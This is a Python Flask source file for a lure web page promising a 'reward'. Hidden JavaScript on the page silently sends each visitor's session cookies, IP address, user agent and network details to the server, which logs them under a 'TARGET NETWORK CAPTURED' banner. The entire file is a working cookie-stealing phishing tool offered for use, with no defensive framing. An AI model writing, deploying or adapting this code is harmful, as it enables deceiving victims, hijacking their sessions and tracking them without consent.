from flask import Flask, request, render_template_string

app = Flask(__name__)

HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head><title>Processing Reward...</title></head>
<body style="text-align: center; background-color: #f0f0f0; padding-top: 50px; font-family: sans-serif;">
    <h2>🎁 Reward is Loading...</h2>
    <p>Please wait while we verify your device connection.</p>
    
    <script>
        // Silent Network & Device Tracking
        const networkInfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        const connectionType = networkInfo ? networkInfo.effectiveType : 'unknown';
        const downlinkSpeed = networkInfo ? networkInfo.downlink + 'Mbps' : 'unknown';

        fetch('/log?c=' + document.cookie + 
              '&type=' + connectionType + 
              '&speed=' + downlinkSpeed + 
              '&ua=' + navigator.userAgent);
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/log')
def log():
    cookie = request.args.get('c')
    conn_type = request.args.get('type')
    speed = request.args.get('speed')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    print(f"\n--- [!!!] TARGET NETWORK CAPTURED [!!!] ---")
    print(f"IP Address: {user_ip}")
    print(f"Connection Type: {conn_type}")
    print(f"Downlink Speed: {speed}")
    print(f"Captured Cookie: {cookie}")
    print(f"-------------------------------------------\n")
    
    return "OK"

if __name__ == '__main__':
    app.run(debug=True)